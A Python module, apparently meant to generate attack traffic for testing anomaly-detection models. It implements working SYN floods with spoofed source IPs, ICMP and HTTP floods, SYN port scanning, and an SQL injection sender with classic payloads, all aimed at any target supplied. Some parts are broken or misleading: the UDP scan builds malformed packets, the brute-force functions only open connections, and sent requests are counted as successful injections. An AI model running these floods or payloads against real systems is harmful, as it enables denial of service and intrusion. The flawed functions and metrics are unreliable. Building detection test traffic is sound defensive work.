"""
ATTACK SIMULATOR MODULE
Simulates real network attacks for testing anomaly detection models.
"""

from scapy.all import IP, TCP, ICMP, send, sr
import random
import time
import threading
import socket
import requests

# ===== 1. DDOS ATTACK SIMULATORS =====

def simulate_ddos_flood(target_ip, attack_duration=30, packet_rate=100):
    """
    Simulates a SYN flood (DDoS attack).
    
    Args:
        target_ip: Target IP address (e.g., '192.168.1.1')
        attack_duration: How long to send packets (seconds)
        packet_rate: Packets per second
    """
    print(f"\n🔴 [DDOS ATTACK] Starting SYN flood to {target_ip}")
    print(f"   Duration: {attack_duration}s | Rate: {packet_rate} pps")
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < attack_duration:
        try:
            # Create malicious SYN packet with spoofed IP
            spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            packet = IP(dst=target_ip, src=spoofed_ip) / TCP(
                dport=random.choice([80, 443, 8080]),
                flags="S",  # SYN flag
                seq=random.randint(0, 2**32-1)
            )
            
            send(packet, verbose=False)
            packet_count += 1
            
            if packet_count % 50 == 0:
                print(f"   [{packet_count}] SYN packets sent ({time.time()-start_time:.1f}s)")
            
            # Control packet rate
            time.sleep(1.0 / packet_rate)
        
        except Exception as e:
            print(f"   ⚠️ Warning: {str(e)[:50]}")
            break
    
    print(f"✅ DDoS simulation complete. Total packets: {packet_count}\n")
    return packet_count


def simulate_icmp_flood(target_ip, attack_duration=30, packet_rate=100):
    """
    Simulates ICMP flood (Ping flood).
    """
    print(f"\n🔴 [ICMP FLOOD] Attacking {target_ip}")
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < attack_duration:
        try:
            packet = IP(dst=target_ip) / ICMP(type="echo-request")
            send(packet, verbose=False)
            packet_count += 1
            time.sleep(1.0 / packet_rate)
        except:
            break
    
    print(f"✅ ICMP flood complete. Packets sent: {packet_count}\n")
    return packet_count


def simulate_http_ddos(target_url, attack_duration=30, concurrent_threads=10):
    """
    Simulates HTTP request flood (Layer 7 DDoS).
    
    Args:
        target_url: Target URL (e.g., 'http://192.168.1.1:8080')
        attack_duration: Attack duration in seconds
        concurrent_threads: Number of concurrent requests
    """
    print(f"\n🔴 [HTTP DDOS] Targeting {target_url}")
    
    request_count = [0]  # Use list to modify in nested function
    
    def send_requests():
        start = time.time()
        while time.time() - start < attack_duration:
            try:
                requests.get(target_url, timeout=2)
                request_count[0] += 1
            except:
                pass
    
    threads = []
    for _ in range(concurrent_threads):
        t = threading.Thread(target=send_requests, daemon=True)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"✅ HTTP DDoS simulation complete. Requests: {request_count[0]}\n")
    return request_count[0]


# ===== 2. PORT SCAN SIMULATORS =====

def simulate_port_scan(target_ip, ports=[22, 80, 443, 3306, 8080], verbose=True):
    """
    Simulates a port scan (Nmap-style SYN scan).
    
    Args:
        target_ip: Target IP address
        ports: List of ports to scan
    """
    print(f"\n🔴 [PORT SCAN] Scanning {target_ip} on ports {ports}")
    
    open_ports = []
    
    for port in ports:
        try:
            packet = IP(dst=target_ip) / TCP(
                dport=port, 
                flags="S", 
                seq=random.randint(0, 2**32-1)
            )
            
            response = sr(packet, timeout=1, verbose=0)
            
            for sent, received in response[0]:
                if received[TCP].flags == "SA":  # SYN-ACK = port open
                    open_ports.append(port)
                    if verbose:
                        print(f"   ✅ Port {port} OPEN")
                else:
                    if verbose:
                        print(f"   ❌ Port {port} CLOSED")
        except Exception as e:
            if verbose:
                print(f"   ⚠️ Port {port} - No response")
    
    print(f"✅ Port scan complete. Open ports: {open_ports}\n")
    return open_ports


def simulate_udp_port_scan(target_ip, ports=[53, 123, 161, 5353], attack_rate=50):
    """
    Simulates UDP port scan (service discovery).
    """
    print(f"\n🔴 [UDP PORT SCAN] Probing {target_ip}")
    
    probe_count = 0
    for port in ports:
        try:
            packet = IP(dst=target_ip) / IP(proto="udp") / ("GET" * 10)
            send(packet, verbose=False)
            probe_count += 1
            print(f"   UDP probe sent to port {port}")
        except:
            pass
    
    print(f"✅ UDP scan complete. Probes sent: {probe_count}\n")
    return probe_count


# ===== 3. UNAUTHORIZED ACCESS SIMULATORS =====

def simulate_ssh_brute_force(target_ip, target_port=22, attempt_count=50):
    """
    Simulates SSH brute force attempts (connection attempts).
    Note: This only simulates TCP connections; doesn't perform actual authentication.
    """
    print(f"\n🔴 [SSH BRUTE FORCE] Attacking {target_ip}:{target_port}")
    
    successful_connections = 0
    failed_attempts = 0
    
    for attempt in range(attempt_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            result = sock.connect_ex((target_ip, target_port))
            
            if result == 0:
                successful_connections += 1
                print(f"   ✅ Connection #{attempt+1} ESTABLISHED")
            else:
                failed_attempts += 1
            
            sock.close()
            time.sleep(0.2)  # Rate limiting
        
        except Exception as e:
            failed_attempts += 1
    
    print(f"✅ SSH brute force simulation complete")
    print(f"   Successful connections: {successful_connections}")
    print(f"   Failed attempts: {failed_attempts}\n")
    return successful_connections


def simulate_sql_injection_attempts(target_url, num_attempts=30):
    """
    Simulates SQL injection attacks (malicious HTTP requests).
    """
    print(f"\n🔴 [SQL INJECTION] Targeting {target_url}")
    
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(5)--"
    ]
    
    successful_injections = 0
    
    for i in range(num_attempts):
        payload = random.choice(payloads)
        
        try:
            requests.get(
                target_url,
                params={'id': payload},
                timeout=2
            )
            successful_injections += 1
            if i % 10 == 0:
                print(f"   [{i+1}] Payload sent: {payload[:30]}...")
        except:
            pass
    
    print(f"✅ SQL injection simulation complete. Attempts: {successful_injections}\n")
    return successful_injections


def simulate_ftp_brute_force(target_ip, target_port=21, attempt_count=30):
    """
    Simulates FTP brute force login attempts.
    """
    print(f"\n🔴 [FTP BRUTE FORCE] Attacking {target_ip}:{target_port}")
    
    successful_auth = 0
    failed_attempts = 0
    
    usernames = ['admin', 'root', 'ftp', 'test', 'user']
    passwords = ['password', '123456', 'admin', 'root', '']
    
    for attempt in range(attempt_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, target_port))
            
            if result == 0:
                successful_auth += 1
                print(f"   ✅ FTP Connection #{attempt+1} established")
            else:
                failed_attempts += 1
            
            sock.close()
            time.sleep(0.1)
        
        except Exception as e:
            failed_attempts += 1
    
    print(f"✅ FTP brute force complete")
    print(f"   Successful connections: {successful_auth}\n")
    return successful_auth


# ===== 4. UTILITY FUNCTIONS =====

def generate_traffic_summary():
    """Returns a summary of attack metrics for logging."""
    return {
        'timestamp': time.time(),
        'attacks_simulated': 6,
        'total_packets': 0,
        'success_rate': 0.0
    }
